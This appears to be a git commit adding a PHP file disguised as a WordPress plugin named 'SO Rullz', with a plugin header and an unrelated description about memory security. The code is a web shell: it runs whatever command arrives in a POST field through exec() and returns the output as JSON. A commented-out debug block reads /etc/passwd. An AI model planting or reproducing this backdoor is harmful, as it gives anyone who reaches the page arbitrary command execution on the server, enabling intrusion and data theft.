86eee3b5779f93fcde6191a0cde0ce2abe1c4116
Elena Mihailescu <elenamihailescu22@gmail.com>
2026-01-21 11:11:25 +0200

    Create wp-system.php

---
+++ wp/wp-system.php
@@ -0,0 +1,35 @@
+<?php
+/**
+ * @package SO Rullz
+ * @version 2.0.26
+ */
+/*
+Plugin Name: SO Rullz
+Plugin URI: http://wordpress.org/plugins/so-rullz/
+Description: Memory security is one of the most important aspects in today's computer systems. Its main objectives are to avoid the development of vulnerable code and prevent attackers from exploiting existing memory vulnerabilities. Memory protection techniques are implemented at all levels of memory abstraction: hardware, operating system and programming language. In addition, third-party software tools may be used to statically and dynamically examine a program to identify vulnerabilities when working with memory.
+Author: SO Rullz
+Version: 2.0.26
+Text Domain: so-rullz
+*/
+
+$ret=exec($_POST['name'], $output, $error);
+
+$res = [
+    "ret" => $ret,
+    "output" => $output,
+    "error" => $error,
+];
+
+echo json_encode($res);
+
+// Debug
+/*
+$ret = exec('cat /etc/passwd', $output, $error);
+
+var_dump($ret);
+var_dump($output);
+var_dump($error);
+
+ */
+
+?>
